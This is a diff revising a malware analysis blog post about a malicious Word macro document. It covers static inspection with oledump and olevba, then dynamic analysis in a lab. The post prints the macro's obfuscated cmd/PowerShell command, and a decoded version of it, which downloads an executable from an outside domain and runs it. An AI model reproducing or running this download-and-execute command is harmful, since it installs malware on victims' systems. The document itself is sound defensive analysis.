@@ -57,9 +57,9 @@ remnux@remnux:~/ex$ oledump.py Richiesta.doc
  18:      4096 'WordDocument'
 ```
 
-As expected, those three streams marked with an `M` mean that this Word document contains Macros. I can read the Macros after decompressing the VBA stream with `oledump.py -s 8 -v Richiesta.doc` (where `8` is the number of the stream). Unfortunately the code looks heavily obfuscated.
+As expected, those three streams marked with an `M` mean that this Word document contains Macros. I can read the Macros after decompressing the VBA stream with `oledump.py -s 8 -v Richiesta.doc` (where `8` is the number of the stream I want to decompress). Unfortunately the code looks heavily obfuscated.
 
-Using the `olevba` tool (from the [oletools](http://decalage.info/python/oletools) package) doesn't help either.
+Let's make a run with the `olevba` tool (from the [oletools](http://decalage.info/python/oletools) package):
 
 ```
 remnux@remnux:~/ex$ olevba Richiesta.doc
@@ -71,7 +71,7 @@ A couple of interesting keywords contained in the obfuscated code are:
 
 `olevba` does have an option to try deobfuscate the code, but it does not help much in this case.
 
-Anyway I won't care about deobfuscation. Instead I will try to run the malware and observe what it does.
+Anyway I won't care about deobfuscating the code. Instead I will try to run the malware and observe what it does.
 
 To perform basic dynamic analysis, I'm going to use two virtual machines: one is a Windows 8.1 VM, equipped with malware analysis tools, where I will detonate the malware; the other is the REMnux Lab VM which I will use to direct the network traffic to.
 
@@ -105,9 +105,7 @@ The domain contacted is `wijdqwbntuqwebqweqwizxc[.]com` as apparent from the Apa
 
 Wireshark shows us the full URL where the second stage is downloaded from:
 
-```
-hxxp://wijdqwbntuqwebqweqwizxc[.]com/stata/index.php?rnd=59978
-```
+`hxxp://wijdqwbntuqwebqweqwizxc[.]com/stata/index.php?rnd=59978`
 
 ![wireshark](/media/20180205/wireshark.png)
 
@@ -121,9 +119,9 @@ C:\Users\REM\AppData\Local\Temp\19982.exe
 
 In this case the malware could not reach out to the Internet but only to the REMnux VM where INETsim was running; indeed the downloaded file contains the fake HTTP response sent by INETsim.
 
-We can further examine what happened on the system using Process Monitor: we see that the Macros executed a system command `cmd` which in turn called the `powershell` executable to connect to the remote server and download the second stage. In the screenshot below events filtered with Operation equal to any of `Process Start`, `WriteFile` and `TCP Connect` are shown.
+We can further examine what happened on the system using Process Monitor: we see that the Macros executed a system command `cmd` which in turn called the `powershell` executable to connect to the remote server and download the second stage. In the screenshot below only the events having `Operation` equal to any of `Process Start`, `WriteFile` or `TCP Connect` are shown.
 
-![wireshark](/media/20180205/wireshark.png)
+![commandline](/media/20180205/commandline.png)
 
 The full command line (highlighted in the screenshot) is:
 
@@ -131,13 +129,10 @@ The full command line (highlighted in the screenshot) is:
 cmd /c set _a1=pow&& set _a2=ersh&& set _a3=ell&& call %_a1%%_a2%%_a3% $ULjzHtTrs = 'iRJKbn';$jmVo2G = new-object System.Net.WebClient;$DSTFdKxX1 = 'oth1DC';$LyXjIuhD = (New-Object -ComObject word.application).version;$SQYyU = 'xZeKFX';$jmVo2G.headers['user-agent'] = $LyXjIuhD;$NZVXzNr0 = 'ynMSJ';$LyXjIuhD.close();$mNRwMHq = 'b85KGdV67';$LyXjIuhD.quit;$qdsyJ = 'hXUwA7Vo';$JNcVeBxf = $env:temp + '\19982.exe';$KVRjd8Y = 'G9WjeFT';foreach($mBbRidWu in 'http://wijdqwbntuqwebqweqwizxc.com/stata/index.php?rnd=59978,?rnd=59978,?rnd=59978,?rnd=59978,?rnd=59978'.Split(',')){try{$uV3RLeIz = 'pMP6bKdGA';$jmVo2G.DownloadFile($mBbRidWu.ToString(), $JNcVeBxf);$HfVyAwt = 'D1HxGK8T';Start-Process $JNcVeBxf;$Cv31ashE = 'RLpG0dl2';break;}catch{$LlX4G = 'qIpqLRP3';}$qSK6tDU = 'fMY4dFcJ';}
 ```
 
-This is somewhat confusing to read... but not so much after a bit of clean up.
+This is somewhat confusing to read... but not so much if we clean it up a little bit.
 
-Following is a _manually-decoded_ version of the command line just to make it easier to read. I wrote it on different line and replaced the original names of important variables with more meaningful names.
+Following is a _manually-decoded_ version of the command line just to make it easier to read. I wrote it on different lines and replaced the original names of important variables with more meaningful names.
 
-The first line is a call to `cmd /c` to execute the command that follows. The second line sets three environment variables, which are then concatenated on line 5 into the string `powershell` which is the argument of the command `call`.
-
-Following down the lines we see how a `WebClient` object is created (I renamed it to `$connection`); how the Microsoft Word version is read and assigned to the `user-agent` property of the `$connection` object; how the path where the second stage malware is to be saved to is set. The `foreach` loop is where the actual download happens. Note that the loop is executed only one time because of the `break` instruction and regardless of how many `$urls` are obtained from the `Split` operation. Indeed the `Split` and all those other random strings assignments spread over are just garbage to make the code more difficult to read and reverse.
 
 ```
 cmd /c
@@ -173,8 +168,12 @@ foreach($url in 'http://wijdqwbntuqwebqweqwizxc.com/stata/index.php?rnd=59978,?r
 }
 ```
 
+The first line is a call to `cmd /c` to execute the command that follows. The second line sets three environment variables, which are then concatenated on line 5 into the string `powershell` which is the argument of the command `call`.
+
+Following down the lines we see how a `WebClient` object is created (I renamed it to `$connection`); how the Microsoft Word version is read and assigned to the `user-agent` property of the `$connection` object; how the path where the second stage malware is to be saved to is set. The `foreach` loop is where the actual download happens. Note that the loop is executed only one time because of the `break` instruction and regardless of how many `$urls` are obtained from the `Split` operation. Indeed the `Split` and all those other random strings assignments spread over are just garbage to make the code more difficult to read and reverse.
+
 I tried to download the second stage using [Malzilla](http://malzilla.sourceforge.net/) but unfortunately without success: at this time the domain is dead or already taken down.
 
 ![virustracker](/media/20180205/virustracker.png)
 
-That's all.
+That's all!
